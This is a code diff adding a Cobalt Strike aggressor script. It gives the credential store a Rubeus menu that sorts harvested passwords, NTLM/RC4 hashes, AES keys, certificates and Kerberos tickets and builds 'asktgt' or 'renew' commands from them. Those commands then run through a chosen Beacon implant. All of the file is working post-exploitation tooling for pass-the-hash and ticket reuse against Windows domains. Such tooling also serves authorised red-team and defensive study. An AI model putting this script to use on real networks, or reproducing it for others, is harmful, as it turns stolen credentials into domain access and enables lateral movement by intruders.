@@ -1,0 +1,215 @@
+debug(7 | 34); # 34 is required for try/catch
+include(script_resource("../rubeus/rubeus_proxy.cna"));
+
+# Rubeus credential-store popup actions.
+
+sub __rubeus_selected_credential_rows_or_error {
+    local('@rows');
+    @rows = $1;
+
+    if (size(@rows) == 0) {
+        show_error("Select at least one credential row.");
+        return @();
+    }
+
+    return @rows;
+}
+
+sub __credentials_rubeus_row_value {
+    local('%row $field');
+    (%row, $field) = @_;
+
+    if (%row[$field] is $null) {
+        return "";
+    }
+
+    return "" . %row[$field];
+}
+
+sub __credentials_rubeus_normalized_type {
+    local('%row $type');
+    %row = $1;
+    $type = lc(__rubeus_trim(__credentials_rubeus_row_value(%row, "type")));
+
+    if ($type eq "") {
+        $type = lc(__rubeus_trim(__credentials_rubeus_row_value(%row, "secret_type")));
+    }
+    if ($type eq "") {
+        $type = lc(__rubeus_trim(__credentials_rubeus_row_value(%row, "kind")));
+    }
+
+    $type = replace($type, '\s|_|-', "");
+    return $type;
+}
+
+sub __credentials_rubeus_secret_option {
+    local('%row $secret $type $lower_secret');
+    %row = $1;
+    $secret = __rubeus_trim(__credentials_rubeus_row_value(%row, "secret"));
+    $type = __credentials_rubeus_normalized_type(%row);
+    $lower_secret = lc($secret);
+
+    if ($secret eq "") {
+        return "";
+    }
+
+    if ([$type indexOf: "ticket"] >= 0 || [$type indexOf: "kirbi"] >= 0 || [$type indexOf: "ccache"] >= 0) {
+        return "";
+    }
+    if ([$type indexOf: "kerberoast"] >= 0 || [$type indexOf: "asrep"] >= 0 || __rubeus_starts_with($lower_secret, "\$krb5")) {
+        return "";
+    }
+    if ([$type indexOf: "aes256"] >= 0) {
+        return "/aes256:" . $secret;
+    }
+    if ([$type indexOf: "aes128"] >= 0) {
+        return "/aes128:" . $secret;
+    }
+    if ([$type indexOf: "rc4"] >= 0 || [$type indexOf: "ntlm"] >= 0 || [$type indexOf: "nthash"] >= 0) {
+        return "/rc4:" . $secret;
+    }
+    if ([$type indexOf: "cert"] >= 0 || [$type indexOf: "pfx"] >= 0) {
+        return "/certificate:" . $secret;
+    }
+    if ([$type indexOf: "password"] >= 0 || [$type indexOf: "plain"] >= 0 || [$type indexOf: "plaintext"] >= 0) {
+        return "/password:" . $secret;
+    }
+
+    if ($secret ismatch "^[A-Fa-f0-9]{64}$") {
+        return "/aes256:" . $secret;
+    }
+    if ($secret ismatch "^[A-Fa-f0-9]{32}$") {
+        return "/rc4:" . $secret;
+    }
+    if (__rubeus_starts_with($lower_secret, "miif") || __rubeus_starts_with($lower_secret, "mii") || $lower_secret ismatch ".*\\.pfx$" || $lower_secret ismatch ".*\\.p12$") {
+        return "/certificate:" . $secret;
+    }
+
+    return "/password:" . $secret;
+}
+
+sub __credentials_rubeus_has_asktgt_context {
+    local('%row $user $realm');
+    %row = $1;
+    $user = __rubeus_trim(__credentials_rubeus_row_value(%row, "user"));
+    $realm = __rubeus_trim(__credentials_rubeus_row_value(%row, "realm"));
+
+    return iff($user ne "" && $realm ne "", 1, 0);
+}
+
+sub __credentials_rubeus_is_ticket_row {
+    local('%row $type $secret');
+    %row = $1;
+    $type = __credentials_rubeus_normalized_type(%row);
+    $secret = __rubeus_trim(__credentials_rubeus_row_value(%row, "secret"));
+
+    if ([$type indexOf: "ticket"] >= 0 || [$type indexOf: "kirbi"] >= 0 || [$type indexOf: "ccache"] >= 0) {
+        return 1;
+    }
+    if (__rubeus_starts_with($secret, "doI") || __rubeus_starts_with($secret, "YII")) {
+        return 1;
+    }
+
+    return 0;
+}
+
+sub __credentials_rubeus_rows_can_asktgt {
+    local('@rows %row');
+    @rows = $1;
+
+    foreach %row (@rows) {
+        if (__credentials_rubeus_has_asktgt_context(%row) == 1 && __credentials_rubeus_is_ticket_row(%row) == 0 && __credentials_rubeus_secret_option(%row) ne "") {
+            return 1;
+        }
+    }
+
+    return 0;
+}
+
+sub __credentials_rubeus_rows_can_renew {
+    local('@rows %row');
+    @rows = $1;
+
+    foreach %row (@rows) {
+        if (__credentials_rubeus_is_ticket_row(%row) == 1) {
+            return 1;
+        }
+    }
+
+    return 0;
+}
+
+sub __credentials_rubeus_asktgt_arguments {
+    local('%row $secret_option');
+    %row = $1;
+    $secret_option = __credentials_rubeus_secret_option(%row);
+
+    if (__credentials_rubeus_has_asktgt_context(%row) == 0) {
+        show_error("Rubeus asktgt needs credential user and realm fields.");
+        return "";
+    }
+    if ($secret_option eq "") {
+        show_error("Rubeus asktgt needs a password, RC4/AES key, or certificate. Use Renew ticket for ticket credentials.");
+        return "";
+    }
+
+    return __rubeus_trim("asktgt /user:" . %row["user"] . " " . $secret_option . " /domain:" . %row["realm"]);
+}
+
+sub __credentials_rubeus_renew_arguments {
+    local('%row');
+    %row = $1;
+    if (__credentials_rubeus_is_ticket_row(%row) == 0) {
+        show_error("Rubeus renew needs a ticket credential. Use asktgt for password, RC4/AES key, or certificate credentials.");
+        return "";
+    }
+
+    return __rubeus_trim("renew /user:" . %row["user"] . " /ticket:" . %row["secret"] . " /dc:" . %row["realm"]);
+}
+
+sub __credentials_open_rubeus_beacon_dialog {
+    local('@rows $command_builder $dialog');
+    @rows = __rubeus_selected_credential_rows_or_error($1);
+    $command_builder = $2;
+
+    if (size(@rows) == 0) {
+        return;
+    }
+
+    $dialog = dialog("Select a Beacon", %(beacon => ""), lambda({
+        local('$bid %row $arguments');
+        $bid = $3["beacon"];
+
+        foreach %row (@rows) {
+            $arguments = [$command_builder: %row];
+            if ($arguments ne "") {
+                run_rubeus_parser($bid, $arguments);
+            }
+        }
+    }, @rows => @rows, $command_builder => $command_builder));
+    dialog_description($dialog, "Select the beacon where the Rubeus command is going to run.");
+    drow_beacon($dialog, "beacon", "Beacon: ");
+    dbutton_action($dialog, "OK");
+    dialog_show($dialog);
+}
+
+try {
+    popup credentials {
+        separator();
+        menu "&Rubeus" {
+            if (__credentials_rubeus_rows_can_asktgt($1) == 1) {
+                item "asktgt" {
+                    __credentials_open_rubeus_beacon_dialog($1, &__credentials_rubeus_asktgt_arguments);
+                }
+            }
+            if (__credentials_rubeus_rows_can_renew($1) == 1) {
+                item "Renew ticket" {
+                    __credentials_open_rubeus_beacon_dialog($1, &__credentials_rubeus_renew_arguments);
+                }
+            }
+        }
+    }
+}
+catch $e {
+    println("This dialog is unsupported in this CS version");
+}
